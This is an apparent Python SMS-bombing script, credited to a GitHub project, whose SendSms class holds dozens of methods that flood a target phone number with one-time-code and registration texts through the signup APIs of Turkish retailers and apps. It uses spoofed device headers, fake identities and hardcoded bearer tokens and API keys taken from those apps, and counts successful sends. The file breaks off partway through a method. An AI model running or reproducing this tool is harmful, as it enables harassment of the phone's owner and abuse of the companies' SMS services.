#Credits : https://github.com/tingirifistik/Enough-Reborn
import random
import string
import math
import json
import urllib.parse
import urllib3 as u3
import requests
from urllib3.exceptions import InsecureRequestWarning
from typing import List, Dict, Any, Optional
from concurrent.futures import ThreadPoolExecutor, wait, Future
import time # Added import for time module
# The try-except block for requests and colorama installation is removed.
# If modules are missing, the initial import will fail and the script will exit.

from colorama import Fore, Style
from time import sleep
from os import system

class SendSms():
    adet: int = 0 # Added type hint
    
    def __init__(self, phone: str, mail: str): # Added type hints
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(random.choice(string.ascii_lowercase) for _ in range(20))+"@gmail.com"


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Page-Url": "/kayit-ol", "Content-Type": "application/json;charset=utf-8", "Positive-Client": "kahvedunyasi", "Positive-Client-Type": "web", "Store-Id": "1", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers", "Connection": "close"}
            json_data: Dict[str, Any] = {"mobile_number": self.phone, "token_type": "register_token"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:    
            return False
     
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            }, timeout=6)
            if wmf.status_code == 202:
                self.adet += 1   
                return True
            else:
                return False
        except:
            return False
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            if bim.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #englishhome.com
    def Englishhome(self):
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json_data: Dict[str, Any] = {"Phone": "+90"+self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["isError"] == False:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            

    #icq.net
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["response"]["statusCode"] == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
          

    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC", "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4", "Accept-Language": "en"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["code"] == "common.success":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json_data: Dict[str, Any] = {"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if (r.json()["kod"]) == "0000":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            if r.status_code == 202:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False 


    #heyscooter.com.tr
    def Hey(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["IsSuccess"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False

        
    #bisu.com.tr
    def Bisu(self):
        try:
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Device-Platform": "IOS", "X-Build-Version-Name": "9.4.0", "Authorization": "0561b4dd-e668-48ac-b65e-5afa99bf098e", "X-Build-Version-Code": "22", "Accept": "*/*", "X-Device-Manufacturer": "Apple", "X-Device-Locale": "en", "X-Client-Device-Id": "66585653-CB6A-48CA-A42D-3F266677E3B5", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-Device-Platform-Version": "15.7.7", "User-Agent": "BiSU/22 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Model": "iPhone 7 Plus", "X-Build-Type": "Release"}
            data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["errors"] == None:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #345dijital.com
    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json_data: Dict[str, Any] = {"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            # Changed logic: if it's already registered, it means the API works for registration/SMS
            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!" or r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #macrocenter.com.tr
    def Macro(self):
        try:
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp?reid=31"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.macrocenter.com.tr/kayit", "Content-Type": "application/json", "X-Forwarded-Rest": "true", "X-Pwa": "true", "X-Device-Pwa": "true", "Origin": "https://www.macrocenter.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json_data: Dict[str, Any] = {"email": self.mail, "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["successful"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json_data: Dict[str, Any] = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    

    #ayyildiz.com.tr
    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.json()["Success"] == True:
                self.adet += 1
                return True
            else:
                return False      
        except:
            return False


    #naosstars.com
    def Naosstars(self):
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json_data: Dict[str, Any] = {"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #istegelsin.com
    def Istegelsin(self):
        try:
            url = "https://prod.fasapi.net:443/"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "App-Version": "2528", "Accept-Encoding": "gzip, deflate", "Platform": "IOS", "User-Agent": "ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9"}
            json_data: Dict[str, Any] = {"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": f"90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["data"]["sendOtp2"]["alreadySent"] == False: # This means it successfully sent a new OTP
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #koton.com
    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #hayatsu.com.tr
    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.json()["is_success"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #hizliecza.com.tr
    def Hizliecza(self):
        try:
            url = "https://hizlieczaprodapi.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "hizliecza/12 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "Bearer null"}
            json_data: Dict[str, Any] = {"otpOperationType": 2, "phoneNumber": f"+90{self.phone}"} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["isSuccess"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #ipragaz.com.tr
    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "X-Api-Token": "", "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", "Accept": "*/*", "App-Name": "ipragaz-mobile", "Os": "ios", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", "App-Build": "41", "Os-Version": "15.7.7", "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", "Connection": "close"}
            json_data = {"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", "name": "Memati Bas", "otp": "", "phoneNumber": self.phone, "playerId": ""} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #metro-tr.com
    def Metro(self):
        try:
            url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Applicationversion": "2.1.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json_data = {"methodType": "2", "mobilePhoneNumber": f"+90{self.phone}"} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["status"] == "success":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False

    
    #qumpara.com
    def Qumpara(self):
        try:
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "qumpara/4.2.53 (iPhone; iOS 15.7.7; Scale/3.00)", "Accept-Language": "en-TR;q=1, tr-TR;q=0.9"}
            json_data = {"msisdn": f"+90{self.phone}"} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #paybol.com.tr
    def Paybol(self):
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json_data = {"phone_number": f"90{self.phone}"} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["status"] == 0:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False

        
    #migros.com.tr
    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
            headers = {"User-Agent": "Migros/1917 CFNetwork/1335.0.3.4 Darwin/21.6.0", "X-Device-Model": "iPhone 31 Plus", "X-Device-Type": "MOBILE", "X-Device-App-Screen": "OTHER", "X-Device-Language": "tr-TR", "X-Device-App-Version": "10.6.13", "X-Device-Current-Long": "", "X-Request-Identifier": "FBE85947-6E31-49AC-AC8C-317B21D79E80", "X-Device-Selected-Address-Lat": "", "X-Device-Platform-Version": "15.8.0", "X-Device-Current-Lat": "", "X-Device-Platform": "IOS", "X-Store-Ids": "", "X-Device-Longitude": "", "Accept-Language": "tr-TR,tr;q=0.9", "Accept": "*/*", "Content-Type": "application/json", "X-Device-Latitude": "", "Accept-Encoding": "gzip, deflate, br", "X-Device-Selected-Address-Long": "", "X-Device-Identifier": "31CAAD3F-5B53-315B-9C6D-31310D86826C"}
            json_data = {"email": self.mail, "phoneNumber": self.phone} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["successful"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #file.com.tr
    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json_data = {"mobilePhoneNumber": f"90{self.phone}"} # Renamed json to json_data
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #joker.com.tr
    def Joker(self):
        try:
            url = "https://api.joker.com.tr:443/api/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE2OTA3MTY1MjEsImV4cCI6MTY5NTkwMDUyMSwidXNlcm5hbWUiOiJHVUVTVDE2OTA3MTY1MjEzMzA3MzdAam9rZXIuY29tLnRyIiwiZ3Vlc3QiOnRydWV9.TaQA8ZDtmU09eFqOFATS8ubXM4BHPQL_BcgeEoqZfuNZcfjfL_xzqRO7fZehzWzEdjHXNXeCUTdjx76EyVB-b3TFuL3OahmrbeaOICD8MXchhMDv78TFhWzOJ9Ad-Mma6QPScSSVL0pYoQHWRhzaeOkmVeypqYiQKGmOEk9NzfOVxDYPa25iJmetiab1Z_b95Hqt5Cls52V7g4pGWmbjYB3gyeUQn5II6neKN174txp1yaGdrNPYwAk_aRJzoAMA1SisZm4rhjdE_9MeyGwjbgk2obPxEVcwvPPwkd56_a34aDOeo6rAvngGALBPWlS89nfHFb6PU2fKyK7jTaVlC0DiVnojlkC_KzoHcptM7SjQBym4Bn9CXZ4kj2J1Om-dhDymQynSCfmQ3JZQd7n1YdQYYMuAoTbjghZhyPu2SCtlI7ao6JhUUcmtO3fjIiyYgAdgD-FDcqSGAs9i5fn3kCidSku5M4ljq1ovJM4BeaNeQdFXqE_WqurpOeLA95fNumGCoXvJGlLhS5VzMdFT-l3cfdPt0V0WmtjJDRpTnosjgfizx4FqftlVuF98uoFoexg7lQYHyZ-j455-d5B24_WfU8GCjQhtlDVtSTcMiRvUKEjJ-Glm5syv5VVbR7mJxu64SB2J2dPbHcIk6BQuFYXIJklN7GXxDa8mSnEZds", "Accept-Encoding": "gzip, deflate", "User-Agent": "Joker/4.0.14 (com.joker.app; build:2; iOS 15.7.7) Alamofire/5.4.3", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Connection": "close"}
            json_data: Dict[str, Any] = {"firstName": "Memati", "gender": "m", "iosVersion": "4.0.2", "lastName": "Bas", "os": "IOS", "password": "31ABC..abc31", "phoneNumber": f"0{self.phone}", "username": self.mail}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["message"] == "Doğrulama kodu gönderildi.":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            
        
    #ak-asya.com.tr
    def Akasya(self):
        try:
            url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json_data: Dict[str, Any] = {"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
        
        
    #akbati.com
    def Akbati(self):
        try:
            url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json_data: Dict[str, Any] = {"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
            if r.json()["result"] == "SMS sended succesfully!":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #clickmelive.com
    def Clickme(self):
        try:
